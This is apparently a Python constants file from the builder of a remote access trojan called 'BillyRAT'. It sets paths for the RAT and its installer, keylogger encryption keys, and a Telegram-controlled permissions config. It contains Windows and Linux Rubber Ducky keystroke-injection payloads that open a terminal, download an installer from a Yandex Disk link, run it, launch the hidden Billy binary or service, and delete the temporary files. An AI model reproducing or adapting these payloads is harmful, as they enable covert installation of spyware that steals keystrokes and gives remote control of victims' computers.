import platform
import constants
import os

os_name = platform.system()

BillyHerrington_network_directory = '/Billy-Herrington/'

parser_name = 'parser.json'
parser_path = parser_name
network_parser_path = os.path.join(
    BillyHerrington_network_directory, parser_name)

camment_name = "comment.txt"
comment_network_path = os.path.join(
    BillyHerrington_network_directory, "{branch_name}", camment_name)
comment_path = camment_name


Billy_windows_name = 'Billy.exe'
Billy_linux_name = 'Billy'
Installer_windows_name = 'Installer.exe'
Installer_linux_name = 'Installer'


BillyHerrington_directory = 'BillyRAT/'

network_token_path = os.path.join(
    BillyHerrington_directory, 'network_token.py')
network_token_value = "token = '{network_token}'"

branch_name_path = os.path.join(
    BillyHerrington_directory, 'branch.py')
branch_name_value = "branch_name = '{branch_name}'"

encryption_keys_path = os.path.join(
    BillyHerrington_directory, 'encryption_keys.py')


obfuscated_BillyHerrington_directory = 'obfuscated_BillyRAT/'

encryption_alth = [chr(i) for i in range(127960, 128260)]
encryption_key_length = 24

encryption_keys_sample = '''
configuration_ek = "{configuration_ek}"
log_ek = "{log_ek}"
keylogger_ek = "{keylogger_ek}"
salt = "{salt}"
'''

configuration_file_path = 'NetworkStructure/configuration'
configuration_file_value = """{{
  "General": {{
    "Keylogger": 0
  }},
  "Users": {{
    "{telegram_id}": {{
      "language": "eng",
      "permissions": {{
        "allowed": ["ALL"],
        "forbidden": []
      }}
    }}
  }}
}}"""

sample_dir_path = 'NetworkStructure/'

compile_dir_path = 'Compile commands/'

Billy_windows_compile_command_path = compile_dir_path + \
    'Billy_windows_compile_command.txt'

Billy_linux_compile_command_path = compile_dir_path + \
    'Billy_linux_compile_command.txt'

Installer_windows_compile_command_path = compile_dir_path + \
    'Installer_windows_compile_command.txt'

Installer_linux_compile_command_path = compile_dir_path + \
    'Installer_linux_compile_command.txt'


if os_name == constants.WINDOWS_OS:
    Billy_compile_command_path = Billy_windows_compile_command_path

if os_name == constants.LINUX_OS:
    Billy_compile_command_path = Billy_linux_compile_command_path

if os_name == constants.WINDOWS_OS:
    Installer_compile_command_path = Installer_windows_compile_command_path

if os_name == constants.LINUX_OS:
    Installer_compile_command_path = Installer_linux_compile_command_path

compile_dir_path = 'dist/'

rubber_ducky_scripts_path = 'Rubber Ducky Scripts/'

windows_rubber_ducky_script = """GUI r
DELAY 500
STRING cmd
DELAY 500
ENTER
DELAY 750
STRING curl -k -s https://cloud-api.yandex.net/v1/disk/public/resources/download?public_key={link} > temp.txt & powershell -command "Get-Content "temp.txt" | Select-String -Pattern 'https://downloader.disk.yandex.ru/disk/.+?=v3' | ForEach-Object {{$_.Matches.value}}" > temp2.txt & for /f "delims=" %u in (temp2.txt) do curl -k -s -L "%u" -o Installer.exe & del temp.txt & del temp2.txt & start "" /wait Installer.exe & del Installer.exe & "C:/Users/%username%/AppData/Local/Comms/Unistore/data/5/a/billy/Billy.exe" > Nul & exit
DELAY 2000
ENTER"""

linux_rubber_ducky_script = """DELAY 500
ALT F2
DELAY 1000
STRING sh -c "xdg-terminal-exec||kgx||ptyxis||gnome-terminal||mate-terminal||xfce4-terminal||tilix||konsole||xterm"
DELAY 1000
ENTER
DELAY 1000
STRING wget -q -O temp.txt "https://cloud-api.yandex.net/v1/disk/public/resources/download?public_key={link}" ; download_url=$(grep -oP '"href":"\\K[^"]+' temp.txt | head -1); wget -q -O Installer "$download_url"; chmod +x Installer; rm temp.txt; ./Installer; rm Installer; systemctl --user start Billy.service; clear; exit
DELAY 2000
ENTER"""

session_network_token_path = 'network_token.token'

max_length_of_branch_name = 100

forge_api_latest_release = "https://api.github.com/repos/serabobina/Billy/releases/latest"
